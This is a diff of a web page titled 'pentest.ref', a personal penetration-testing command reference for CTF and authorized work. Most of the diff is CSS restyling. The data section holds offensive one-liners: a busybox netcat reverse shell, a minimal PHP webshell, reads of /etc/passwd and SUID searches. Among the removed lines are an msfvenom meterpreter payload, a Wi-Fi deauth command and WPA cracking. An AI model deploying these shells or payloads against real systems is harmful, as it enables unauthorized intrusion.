@@ -5,27 +5,11 @@ page_class: commands
 permalink: /cmd
 ---
 
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>// pentest.ref — command reference</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
-    --bg:#0a0d12;
-    --panel:#11151d;
-    --panel-2:#161c26;
-    --line:#212836;
-    --text:#e7ebf2;
-    --muted:#7d8798;
-    --dim:#4c5566;
-
+    --panel:#111715;
+    --line:rgba(184, 204, 194, 0.16);
+    --dim:#a5aaa5;
     --c-recon:#5ec8d8;
     --c-scan:#5b8def;
     --c-web:#f2a541;
@@ -36,162 +20,541 @@ permalink: /cmd
     --c-misc:#8b95a7;
     --c-tool:#ff8a5c;
   }
-  *{box-sizing:border-box;}
-  html{scroll-behavior:smooth;}
-  body{
-    margin:0;
-    background:
-      radial-gradient(1200px 600px at 100% -10%, #131a24 0%, transparent 60%),
-      var(--bg);
-    color:var(--text);
-    font-family:'JetBrains Mono', monospace;
-    -webkit-font-smoothing:antialiased;
-  }
-  h1,h2,h3,.display{font-family:'Space Grotesk', sans-serif;}
 
-  /* ===== layout shell ===== */
-  .shell{display:grid;grid-template-columns:260px 1fr;min-height:100vh;}
-  @media (max-width:900px){.shell{grid-template-columns:1fr;}}
+  .commands-container {
+    display: grid;
+    grid-template-columns: 260px 1fr;
+    gap: 0;
+    min-height: auto;
+  }
 
   /* ===== sidebar ===== */
-  .sidebar{
-    border-right:1px solid var(--line);
-    background:var(--panel);
-    position:sticky;top:0;height:100vh;overflow-y:auto;
-    padding:22px 16px 40px;
+  .commands-sidebar {
+    border-right: 1px solid var(--line);
+    background: var(--surface);
+    padding: 22px 16px 40px;
+    position: sticky;
+    top: 80px;
+    max-height: calc(100vh - 100px);
+    overflow-y: auto;
   }
-  @media (max-width:900px){.sidebar{position:relative;height:auto;border-right:none;border-bottom:1px solid var(--line);}}
-  .brand{display:flex;align-items:baseline;gap:8px;margin-bottom:4px;}
-  .brand .dot{width:8px;height:8px;border-radius:50%;background:var(--c-exploit);box-shadow:0 0 10px var(--c-exploit);flex:none;}
-  .brand h1{font-size:17px;margin:0;letter-spacing:.5px;}
-  .brand-sub{color:var(--muted);font-size:11px;margin:2px 0 20px 16px;letter-spacing:.5px;}
 
-  .navgroup-label{color:var(--dim);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin:18px 0 8px 2px;}
-  .navlink{
-    display:flex;align-items:center;gap:9px;
-    color:var(--muted);text-decoration:none;font-size:12.5px;
-    padding:6px 8px;border-radius:6px;margin:1px 0;
-    border-left:2px solid transparent;
+  .brand {
+    display: flex;
+    align-items: baseline;
+    gap: 8px;
+    margin-bottom: 4px;
   }
-  .navlink:hover{color:var(--text);background:var(--panel-2);}
-  .navlink.active{color:var(--text);background:var(--panel-2);}
-  .navlink .sw{width:7px;height:7px;border-radius:2px;flex:none;}
 
-  /* ===== main ===== */
-  main{padding:34px clamp(18px,4vw,54px) 100px;max-width:1180px;}
-
-  .topbar{margin-bottom:34px;}
-  .kicker{color:var(--c-exploit);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin:0 0 10px;}
-  .topbar h2.display{font-size:clamp(26px,4vw,38px);margin:0 0 10px;line-height:1.15;}
-  .topbar p{color:var(--muted);font-size:13px;max-width:640px;line-height:1.6;margin:0 0 22px;}
-
-  .searchwrap{
-    display:flex;align-items:center;gap:10px;
-    background:var(--panel);border:1px solid var(--line);
-    border-radius:8px;padding:11px 14px;
+  .brand .dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    background: var(--c-exploit);
+    box-shadow: 0 0 10px var(--c-exploit);
+    flex: none;
   }
-  .searchwrap .prompt{color:var(--c-exploit);font-weight:700;}
-  .searchwrap input{
-    flex:1;background:transparent;border:none;outline:none;
-    color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13.5px;
-  }
-  .searchwrap input::placeholder{color:var(--dim);}
-  .cursor{width:7px;height:15px;background:var(--c-exploit);animation:blink 1s step-start infinite;}
-  @keyframes blink{50%{opacity:0;}}
-  .stat{color:var(--dim);font-size:11px;white-space:nowrap;}
 
-  section.group{margin-top:52px;scroll-margin-top:20px;}
-  .group-head{display:flex;align-items:center;gap:12px;margin-bottom:6px;}
-  .group-head .idx{color:var(--gc);font-family:'Space Grotesk',sans-serif;font-size:12px;font-weight:700;letter-spacing:1px;}
-  .group-head h3{font-size:18px;margin:0;}
-  .group-desc{color:var(--muted);font-size:12px;margin:0 0 18px;}
-  .group-rule{height:1px;background:linear-gradient(90deg, var(--gc), transparent);margin-bottom:18px;opacity:.5;}
-
-  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;}
-
-  .card{
-    background:var(--panel);border:1px solid var(--line);border-left:3px solid var(--gc);
-    border-radius:8px;padding:13px 14px;
-    display:flex;flex-direction:column;gap:8px;
+  .brand h1 {
+    font-size: 17px;
+    margin: 0;
+    letter-spacing: 0.5px;
+    color: var(--text);
   }
-  .card .cmdrow{display:flex;align-items:flex-start;gap:8px;}
-  .card code{
-    font-size:12.5px;color:var(--text);word-break:break-word;line-height:1.5;
-    flex:1;
-  }
-  .card .desc{color:var(--muted);font-size:11.5px;line-height:1.5;}
-  .card .example{
-    font-size:11px;color:var(--dim);background:#0d1119;border:1px dashed var(--line);
-    padding:6px 8px;border-radius:5px;line-height:1.5;word-break:break-word;
-  }
-  .card .example b{color:var(--c-tool);font-weight:600;}
 
-  .copybtn{
-    flex:none;background:var(--panel-2);border:1px solid var(--line);color:var(--muted);
-    font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:.5px;
-    padding:4px 8px;border-radius:5px;cursor:pointer;text-transform:uppercase;
+  .brand-sub {
+    color: var(--dim);
+    font-size: 11px;
+    margin: 2px 0 20px 16px;
+    letter-spacing: 0.5px;
   }
-  .copybtn:hover{color:var(--text);border-color:var(--gc);}
-  .copybtn.copied{color:var(--c-sys);border-color:var(--c-sys);}
 
-  footer{border-top:1px solid var(--line);margin-top:70px;padding-top:22px;color:var(--dim);font-size:11px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
-  .hidden{display:none !important;}
-  .no-results{color:var(--dim);font-size:13px;padding:30px 0;text-align:center;display:none;}
+  .navgroup-label {
+    color: var(--dim);
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    margin: 18px 0 8px 2px;
+  }
+
+  .navlink {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 12.5px;
+    padding: 6px 8px;
+    border-radius: 6px;
+    margin: 1px 0;
+    border-left: 2px solid transparent;
+    transition: all 0.2s ease;
+  }
+
+  .navlink:hover {
+    color: var(--text);
+    background: var(--surface-hover);
+  }
+
+  .navlink.active {
+    color: var(--text);
+    background: var(--surface-hover);
+    border-left-color: var(--accent);
+  }
+
+  .navlink .sw {
+    width: 7px;
+    height: 7px;
+    border-radius: 2px;
+    flex: none;
+  }
+
+  /* ===== main content ===== */
+  .commands-main {
+    padding: 34px clamp(18px, 4vw, 54px) 100px;
+  }
+
+  .topbar {
+    margin-bottom: 34px;
+  }
+
+  .kicker {
+    color: var(--accent);
+    font-size: 11px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin: 0 0 10px;
+  }
+
+  .topbar h2 {
+    font-size: clamp(26px, 4vw, 38px);
+    margin: 0 0 10px;
+    line-height: 1.15;
+    color: var(--text);
+  }
+
+  .topbar p {
+    color: var(--muted);
+    font-size: 13px;
+    max-width: 640px;
+    line-height: 1.6;
+    margin: 0 0 22px;
+  }
+
+  .searchwrap {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 11px 14px;
+    margin-bottom: 20px;
+  }
+
+  .searchwrap .prompt {
+    color: var(--accent);
+    font-weight: 700;
+  }
+
+  .searchwrap input {
+    flex: 1;
+    background: transparent;
+    border: none;
+    outline: none;
+    color: var(--text);
+    font-family: 'DM Mono', monospace;
+    font-size: 13.5px;
+  }
+
+  .searchwrap input::placeholder {
+    color: var(--dim);
+  }
+
+  .cursor {
+    width: 7px;
+    height: 15px;
+    background: var(--accent);
+    animation: blink 1s step-start infinite;
+  }
+
+  @keyframes blink {
+    50% { opacity: 0; }
+  }
+
+  .stat {
+    color: var(--dim);
+    font-size: 11px;
+    white-space: nowrap;
+  }
+
+  section.group {
+    margin-top: 52px;
+    scroll-margin-top: 100px;
+  }
+
+  .group-head {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 6px;
+  }
+
+  .group-head .idx {
+    color: var(--gc);
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 1px;
+  }
+
+  .group-head h3 {
+    font-size: 18px;
+    margin: 0;
+    color: var(--text);
+  }
+
+  .group-desc {
+    color: var(--muted);
+    font-size: 12px;
+    margin: 0 0 18px;
+  }
+
+  .group-rule {
+    height: 1px;
+    background: linear-gradient(90deg, var(--gc), transparent);
+    margin-bottom: 18px;
+    opacity: 0.5;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-left: 3px solid var(--gc);
+    border-radius: 8px;
+    padding: 13px 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    transition: all 0.2s ease;
+  }
+
+  .card:hover {
+    border-color: var(--gc);
+    background: var(--surface-hover);
+  }
+
+  .card .cmdrow {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+  }
+
+  .card code {
+    font-size: 12.5px;
+    color: var(--text);
+    word-break: break-word;
+    line-height: 1.5;
+    flex: 1;
+  }
+
+  .card .desc {
+    color: var(--muted);
+    font-size: 11.5px;
+    line-height: 1.5;
+  }
+
+  .card .example {
+    font-size: 11px;
+    color: var(--dim);
+    background: rgba(5, 10, 8, 0.8);
+    border: 1px dashed var(--line);
+    padding: 6px 8px;
+    border-radius: 5px;
+    line-height: 1.5;
+    word-break: break-word;
+  }
+
+  .card .example b {
+    color: var(--c-tool);
+    font-weight: 600;
+  }
+
+  .copybtn {
+    flex: none;
+    background: var(--surface-hover);
+    border: 1px solid var(--line);
+    color: var(--muted);
+    font-family: 'DM Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 0.5px;
+    padding: 4px 8px;
+    border-radius: 5px;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: all 0.2s ease;
+  }
+
+  .copybtn:hover {
+    color: var(--text);
+    border-color: var(--gc);
+  }
+
+  .copybtn.copied {
+    color: var(--c-sys);
+    border-color: var(--c-sys);
+  }
 
   /* ===== add-command controls ===== */
-  .addbar{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap;}
-  .addbtn{
-    font-family:'JetBrains Mono',monospace;font-size:11.5px;letter-spacing:.3px;
-    padding:9px 14px;border-radius:7px;cursor:pointer;text-transform:uppercase;
+  .addbar {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
   }
-  .addbtn.primary{background:var(--c-exploit);border:none;color:#0a0d12;font-weight:700;}
-  .addbtn.ghost{background:var(--panel);border:1px solid var(--line);color:var(--muted);}
-  .addbtn.ghost:hover{color:var(--text);border-color:var(--dim);}
 
-  .modal-backdrop{
-    position:fixed;inset:0;background:rgba(6,8,12,.72);backdrop-filter:blur(2px);
-    display:none;align-items:center;justify-content:center;z-index:50;padding:20px;
+  .addbtn {
+    font-family: 'DM Mono', monospace;
+    font-size: 11.5px;
+    letter-spacing: 0.3px;
+    padding: 9px 14px;
+    border-radius: 7px;
+    cursor: pointer;
+    text-transform: uppercase;
+    border: none;
+    transition: all 0.2s ease;
   }
-  .modal-backdrop.open{display:flex;}
-  .modal{
-    background:var(--panel);border:1px solid var(--line);border-radius:12px;
-    width:100%;max-width:480px;padding:22px;
-  }
-  .modal h4{margin:0 0 4px;font-size:16px;}
-  .modal .modal-sub{color:var(--muted);font-size:11.5px;margin:0 0 18px;}
-  .field{margin-bottom:12px;}
-  .field label{display:block;color:var(--dim);font-size:10.5px;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px;}
-  .field input, .field select, .field textarea{
-    width:100%;background:var(--panel-2);border:1px solid var(--line);color:var(--text);
-    font-family:'JetBrains Mono',monospace;font-size:12.5px;padding:9px 10px;border-radius:6px;outline:none;
-  }
-  .field input:focus, .field select:focus, .field textarea:focus{border-color:var(--c-exploit);}
-  .field textarea{resize:vertical;min-height:44px;}
-  .modal-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:18px;}
 
-  .yours-badge{
-    font-size:9.5px;letter-spacing:.5px;text-transform:uppercase;color:var(--c-exploit);
-    border:1px solid var(--c-exploit);border-radius:4px;padding:1px 6px;flex:none;
+  .addbtn.primary {
+    background: var(--accent);
+    color: #05130e;
+    font-weight: 700;
   }
-  .delbtn{
-    flex:none;background:transparent;border:none;color:var(--dim);cursor:pointer;font-size:14px;line-height:1;padding:2px 4px;
+
+  .addbtn.primary:hover {
+    background: #46ebb1;
   }
-  .delbtn:hover{color:var(--c-exploit);}
+
+  .addbtn.ghost {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    color: var(--muted);
+  }
+
+  .addbtn.ghost:hover {
+    color: var(--text);
+    border-color: var(--dim);
+  }
+
+  .modal-backdrop {
+    position: fixed;
+    inset: 0;
+    background: rgba(6, 8, 12, 0.72);
+    backdrop-filter: blur(2px);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 50;
+    padding: 20px;
+  }
+
+  .modal-backdrop.open {
+    display: flex;
+  }
+
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    width: 100%;
+    max-width: 480px;
+    padding: 22px;
+  }
+
+  .modal h4 {
+    margin: 0 0 4px;
+    font-size: 16px;
+    color: var(--text);
+  }
+
+  .modal .modal-sub {
+    color: var(--muted);
+    font-size: 11.5px;
+    margin: 0 0 18px;
+  }
+
+  .field {
+    margin-bottom: 12px;
+  }
+
+  .field label {
+    display: block;
+    color: var(--dim);
+    font-size: 10.5px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 5px;
+  }
+
+  .field input,
+  .field select,
+  .field textarea {
+    width: 100%;
+    background: var(--surface-hover);
+    border: 1px solid var(--line);
+    color: var(--text);
+    font-family: 'DM Mono', monospace;
+    font-size: 12.5px;
+    padding: 9px 10px;
+    border-radius: 6px;
+    outline: none;
+  }
+
+  .field input:focus,
+  .field select:focus,
+  .field textarea:focus {
+    border-color: var(--accent);
+  }
+
+  .field textarea {
+    resize: vertical;
+    min-height: 44px;
+  }
+
+  .modal-actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    margin-top: 18px;
+  }
+
+  .yours-badge {
+    font-size: 9.5px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    color: var(--accent);
+    border: 1px solid var(--accent);
+    border-radius: 4px;
+    padding: 1px 6px;
+    flex: none;
+  }
+
+  .delbtn {
+    flex: none;
+    background: transparent;
+    border: none;
+    color: var(--dim);
+    cursor: pointer;
+    font-size: 14px;
+    line-height: 1;
+    padding: 2px 4px;
+  }
+
+  .delbtn:hover {
+    color: var(--c-exploit);
+  }
+
+  .hidden {
+    display: none !important;
+  }
+
+  .no-results {
+    color: var(--dim);
+    font-size: 13px;
+    padding: 30px 0;
+    text-align: center;
+    display: none;
+  }
+
+  .commands-footer {
+    border-top: 1px solid var(--line);
+    margin-top: 70px;
+    padding-top: 22px;
+    color: var(--dim);
+    font-size: 11px;
+    display: flex;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+
+  @media (max-width: 900px) {
+    .commands-container {
+      grid-template-columns: 1fr;
+    }
+
+    .commands-sidebar {
+      border-right: none;
+      border-bottom: 1px solid var(--line);
+      position: relative;
+      top: 0;
+      max-height: auto;
+    }
+
+    .commands-main {
+      padding: 24px clamp(16px, 4vw, 40px) 60px;
+    }
+
+    .grid {
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+    }
+  }
+
+  @media (max-width: 640px) {
+    .commands-main {
+      padding: 20px 16px 50px;
+    }
+
+    .topbar h2 {
+      font-size: 24px;
+    }
+
+    .topbar p {
+      font-size: 12px;
+      margin-bottom: 16px;
+    }
+
+    .searchwrap {
+      padding: 8px 10px;
+    }
+
+    .grid {
+      grid-template-columns: 1fr;
+      gap: 10px;
+    }
+
+    .card {
+      padding: 10px 12px;
+    }
+
+    .addbar {
+      flex-direction: column;
+    }
+
+    .addbtn {
+      width: 100%;
+    }
+  }
 </style>
-</head>
-<body>
-<div class="shell">
-  <aside class="sidebar" id="sidebar">
+
+<div class="commands-container">
+  <aside class="commands-sidebar" id="sidebar">
     <div class="brand"><span class="dot"></span><h1>pentest.ref</h1></div>
     <div class="brand-sub">command reference // v1</div>
     <div id="navlist"></div>
   </aside>
 
-  <main>
+  <main class="commands-main">
     <div class="topbar">
       <p class="kicker">personal reference — learn · practice · exploit ethically</p>
-      <h2 class="display">Penetration Testing<br>Command Reference</h2>
-      <p>Every command below is grouped by tool or phase of engagement, with a one-line explanation and, for the deep-dive tools, a worked example. Type below to filter across all sections — click any command to copy it.</p>
+      <h2>Penetration Testing<br>Command Reference</h2>
+      <p>Every command below is grouped by tool or phase of engagement, with a one-line explanation and, for the deep-dive tools, a worked example. Type below to filter across all sections.</p>
       <div class="searchwrap">
         <span class="prompt">$</span>
         <input id="search" type="text" placeholder="filter commands, e.g. 'subdomain' or 'sqlmap'" autocomplete="off">
@@ -208,7 +571,7 @@ permalink: /cmd
     <div id="content"></div>
     <p class="no-results" id="noresults">no commands match that filter.</p>
 
-    <footer>
+    <footer class="commands-footer">
       <span>built for CTF &amp; authorized engagements only — always get written scope before you run anything above.</span>
       <span id="totalcount"></span>
     </footer>
@@ -255,11 +618,6 @@ permalink: /cmd
 </div>
 
 <script>
-/* ============================================================
-   DATA — grouped by category. Each group has an id, title,
-   a color token, a short description, and a list of commands.
-   Deep-dive tool sections include worked "example" fields.
-   ============================================================ */
 const DATA = [
 
 { id:"recon", title:"Reconnaissance", color:"--c-recon", desc:"Passive and active information gathering before you touch the target directly.",
@@ -337,7 +695,7 @@ const DATA = [
     ["nc -lvnp <port>","Netcat listener"],
     ["nc <ip> <port>","Netcat connect"],
     ["busybox nc -e /bin/sh <ip> <port>","Reverse shell via busybox nc when standard nc lacks -e"],
-    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access, then call ?cmd=id"],
+    ["&lt;?php system($_GET[\"cmd\"]); ?&gt;","Minimal PHP webshell — drop on a target with file upload/write access"],
     ["openssl s_client -connect <ip>:<port>","SSL connection test"]
   ]},
 
@@ -352,7 +710,7 @@ const DATA = [
     ["cat /etc/passwd","List system users"],
     ["ps aux","Running processes"],
     ["find / -perm 2000 -o -perm 4000 2&gt;/dev/null","SUID/SGID find variant"],
-    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic permission syntax)"],
+    ["find / -perm -u=s -type f 2&gt;/dev/null","Find SUID binaries (symbolic syntax)"],
     ["cat /etc/crontab","Cron jobs"],
     ["env","Environment variables"],
     ["history","Command history"]
@@ -381,18 +739,6 @@ const DATA = [
     ["sha256sum &lt;file&gt;","SHA256 hash"]
   ]},
 
-{ id:"reporting", title:"Reporting", color:"--c-misc", desc:"Documenting findings for the client / write-up.",
-  cmds:[
-    ["dradis","Reporting framework"],
-    ["maltego","Data visualization for reports"],
-    ["faraday","Pen test IDE / collaboration"],
-    ["cutycapt --url &lt;url&gt; --out screenshot.png","Web screenshot capture"],
-    ["leafpad report.txt","Create report notes"],
-    ["pandoc report.md -o report.pdf","Convert markdown to PDF"],
-    ["recordmydesktop","Screen recording for PoC"],
-    ["obs","Advanced screen recording"]
-  ]},
-
 { id:"system", title:"System &amp; Basic Commands", color:"--c-sys", desc:"Everyday Linux commands used constantly during an engagement.",
   cmds:[
     ["ls -la","List directory contents, incl. hidden"],
@@ -408,43 +754,6 @@ const DATA = [
     ["clear","Clear terminal"]
   ]},
 
-{ id:"linux-fs", title:"Linux — Files &amp; Navigation", color:"--c-sys", desc:"Filesystem navigation and manipulation.",
-  cmds:[
-    ["ls -la","List all files, long format"],
-    ["cd ~","Go to home directory"],
-    ["cd ..","Go up one directory"],
-    ["pwd","Print working directory"],
-    ["mkdir test","Create directory"],
-    ["rm -r test","Remove directory recursively"],
-    ["cp a.txt b.txt","Copy a.txt to b.txt"],
-    ["mv old new","Move / rename file"],
-    ["touch notes.txt","Create empty file"],
-    ["less file","Page through file"],
-    ["tail -f log","Follow log live"],
-    ["head -f log","Show first lines of file"],
-    ["find / -name '*.txt'","Search database of files"],
-    ["locate passwd","Search the locate database"],
-    ["strings binary","Print printable strings"],
-    ["file report.pdf","Determine file type"]
-  ]},
-
-{ id:"linux-sys", title:"Linux — System Info &amp; Monitoring", color:"--c-sys", desc:"Understand the box you're standing on.",
-  cmds:[
-    ["date","Show current date/time"],
-    ["uptime","Show current uptime"],
-    ["whoami","Current logged in user"],
-    ["cat /proc/cpuinfo","CPU info"],
-    ["cat /proc/meminfo","Memory info"],
-    ["free -h","Memory and swap usage"],
-    ["df -h","Disk usage (human readable)"],
-    ["du -sh &lt;dir&gt;","Size of a directory"],
-    ["uname -a","Kernel / system info"],
-    ["hostname","System hostname"],
-    ["who","Who is logged in"],
-    ["env","Show environment variables"],
-    ["echo $PATH","Show PATH variable"]
-  ]},
-
 { id:"linux-net", title:"Linux — Networking", color:"--c-sys", desc:"Local networking commands used constantly on target boxes.",
   cmds:[
     ["ping host","Ping a host"],
@@ -452,7 +761,7 @@ const DATA = [
     ["dig -x 8.8.8.8","Reverse DNS lookup"],
     ["wget url","Download a file"],
     ["wget -c url","Resume interrupted download"],
-    ["curl url","Recursively fetch data from a URL"],
+    ["curl url","Fetch data from a URL"],
     ["curl -O url","Save file with original name"],
     ["curl -i url","Show HTTP headers with response"],
     ["curl -L url","Follow redirects"],
@@ -461,241 +770,9 @@ const DATA = [
     ["ssh -D 8080 user@host","SOCKS proxy tunnel"],
     ["ip addr / ifconfig","Show IP address info"],
     ["ss -tuln","Show listening ports"]
-  ]},
-
-{ id:"linux-perm", title:"Linux — Permissions", color:"--c-sys", desc:"chmod/chown fundamentals for privesc and cleanup.",
-  cmds:[
-    ["chmod octal file","Change file permissions"],
-    ["chmod 777 file","rwx rwx rwx (everyone full access)"],
-    ["chmod 755 file","rwx r-x r-x (owner full, others read/execute)"],
-    ["chmod 644 file","rw- r-- r-- (owner read/write, others read)"],
-    ["chown user file","Change file owner"],
-    ["chgrp group file","Change file group"],
-    ["4 = read (r), 2 = write (w), 1 = execute (x)","Permission bit reference"]
-  ]},
-
-{ id:"linux-cron", title:"Linux — Scheduling (cron)", color:"--c-sys", desc:"Persistence and job scheduling — frequently a privesc vector.",
-  cmds:[
-    ["crontab -e","Edit cron jobs for current user"],
-    ["crontab -l","List cron jobs"],
-    ["* * * * * /path/to/script.sh","Cron syntax — min hr day month weekday"],
-    ["man crontab","Cron scheduling manual"]
-  ]},
-
-{ id:"pkg", title:"Package Management", color:"--c-misc", desc:"Installing tooling on Debian/Ubuntu-based systems.",
-  cmds:[
-    ["apt update","Update package list"],
-    ["apt upgrade","Upgrade installed packages"],
-    ["apt install &lt;pkg&gt;","Install package"],
-    ["apt remove &lt;pkg&gt;","Remove package"],
-    ["dpkg -i &lt;pkg.deb&gt;","Install a .deb package"],
-    ["dpkg -r &lt;pkg&gt;","Remove a package"],
-    ["dpkg -l","List installed packages"]
-  ]},
-
-{ id:"maint", title:"Maintenance &amp; Wireless", color:"--c-misc", desc:"Housekeeping plus wireless attack basics.",
-  cmds:[
-    ["sudo apt update","Update package list"],
-    ["sudo apt upgrade","Upgrade packages"],
-    ["sudo apt install &lt;tool&gt;","Install a tool"],
-    ["sudo apt remove &lt;tool&gt;","Remove a tool"],
-    ["df -h","Disk usage"],
-    ["du -sh /","Directory usage"],
-    ["free -h","Memory usage"],
-    ["journalctl -xe","System logs"],
-    ["reboot / shutdown -h now","Restart / shutdown system"],
-    ["iwconfig","Wireless interfaces"],
-    ["iwlist wlan0 scan","Scan networks"],
-    ["airmon-ng start wlan0","Monitor mode"],
-    ["aireplay-ng --deauth 0 -a &lt;BSSID&gt; wlan0","Deauth attack"],
-    ["aircrack-ng capture.cap -w wordlist.txt","Crack WPA/WPA2 handshake"]
-  ]},
-
-{ id:"social", title:"Social Engineering &amp; Files", color:"--c-misc", desc:"Human-layer tooling and the file locations you'll reference constantly.",
-  cmds:[
-    ["setoolkit","Social Engineering Toolkit"],
-    ["gophish","Phishing framework"],
-    ["beef-xss","Browser exploitation framework"],
-    ["msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f exe -o payload.exe","Create payload"],
-    ["/etc/passwd","User accounts"],
-    ["/etc/shadow","Password hashes"],
-    ["/etc/hosts","Host entries"],
-    ["/etc/crontab","Cron jobs"],
-    ["/var/log/","Log files"],
-    ["~/.bash_history","Command history"],
-    ["/root/","Root directory"],
-    ["man &lt;command&gt;","Manual pages"],
-    ["&lt;command&gt; --help","Command help"],
-    ["kali-docs / kali-tools","Kali documentation and tool listing"]
-  ]},
-
-/* ================= DEEP DIVE TOOL SECTIONS ================= */
-
-{ id:"tool-nmap", title:"Nmap — Deep Dive", color:"--c-tool", tool:true, desc:"Network mapper: host discovery, port scanning, service/version detection, and NSE scripting.",
-  cmds:[
-    ["nmap -sV -sC -p- <ip>","Full TCP port scan with default scripts and version detection","nmap -sV -sC -p- 10.10.11.23 — a solid first full scan on a CTF box"],
-    ["nmap -sn 192.168.1.0/24","Host discovery / ping sweep across a subnet","nmap -sn 192.168.1.0/24 — find live hosts before scanning individually"],
-    ["nmap -sU -p 53,161,500 <ip>","Scan common UDP ports","nmap -sU -p 53,161,500 10.10.11.23 — check DNS/SNMP/IKE over UDP"],
-    ["nmap -A -T4 <ip>","Aggressive scan: OS detection, version, scripts, traceroute","nmap -A -T4 10.10.11.23 — quick aggressive recon in one pass"],
-    ["nmap --script vuln <ip>","Run the NSE 'vuln' script category","nmap --script vuln 10.10.11.23 — surface known CVEs on open services"],
-    ["nmap -p 445 --script smb-vuln* <ip>","Check SMB port for known SMB vulnerabilities","nmap -p 445 --script smb-vuln* 10.10.11.23 — check for EternalBlue etc."],
-    ["nmap -sC -sV -oN scan.txt <ip>","Save scan results to a file for later reference","nmap -sC -sV -oN nmap-initial.txt 10.10.11.23"],
-    ["nmap -p- --min-rate 5000 <ip>","Fast full port scan at a high packet rate","nmap -p- --min-rate 5000 -oG allports.txt 10.10.11.23"],
-    ["nmap --script http-title -p 80,443 <ip>","Grab page titles from web ports","nmap --script http-title -p 80,443 10.10.11.23"],
-    ["nmap -sV --version-intensity 9 <ip>","Deep, thorough version detection","nmap -sV --version-intensity 9 -p 22,80 10.10.11.23"]
-  ]},
-
-{ id:"tool-gobuster", title:"Gobuster — Deep Dive", color:"--c-tool", tool:true, desc:"Fast directory, DNS, and vhost brute-forcer written in Go.",
-  cmds:[
-    ["gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt","Directory / file brute force","gobuster dir -u http://target.htb -w /usr/share/wordlists/dirb/common.txt"],
-    ["gobuster dir -u http://<target> -w wordlist.txt -x php,html,txt","Brute force appending common extensions","gobuster dir -u http://target.htb -w big.txt -x php,txt,bak"],
-    ["gobuster dns -d <domain> -w subdomains.txt","Subdomain enumeration via DNS brute force","gobuster dns -d target.htb -w subdomains-top1million.txt"],
-    ["gobuster vhost -u http://<target> -w vhosts.txt","Virtual host enumeration","gobuster vhost -u http://target.htb -w vhosts.txt --append-domain"],
-    ["gobuster dir -u http://<target> -w wordlist.txt -s 200,301,302","Only show specific status codes","gobuster dir -u http://target.htb -w common.txt -s 200,301,302,403"],
-    ["gobuster dir -u http://<target> -w wordlist.txt -t 50","Raise thread count for speed","gobuster dir -u http://target.htb -w common.txt -t 50"],
-    ["gobuster dir -u https://<target> -w wordlist.txt -k","Skip TLS certificate verification (self-signed certs)","gobuster dir -u https://target.htb -w common.txt -k"],
-    ["gobuster fuzz -u http://<target>/FUZZ -w wordlist.txt","Generic FUZZ-keyword based fuzzing mode","gobuster fuzz -u http://target.htb/FUZZ -w common.txt"]
-  ]},
-
-{ id:"tool-ffuf", title:"ffuf — Deep Dive", color:"--c-tool", tool:true, desc:"Fast web fuzzer for directories, parameters, vhosts, and form fields.",
-  cmds:[
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt","Directory / file fuzzing","ffuf -u http://target.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt"],
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -mc 200,301,302","Match only specific HTTP status codes","ffuf -u http://target.htb/FUZZ -w common.txt -mc 200,301"],
-    ["ffuf -u http://<target>/FUZZ -w wordlist.txt -fs 1234","Filter out responses of a known (boring) size","ffuf -u http://target.htb/FUZZ -w common.txt -fs 1234"],
-    ["ffuf -u http://FUZZ.<target> -w subs.txt -H \"Host: FUZZ.<target>\"","Vhost / subdomain fuzzing via Host header","ffuf -u http://FUZZ.target.htb -w subdomains.txt -H \"Host: FUZZ.target.htb\""],
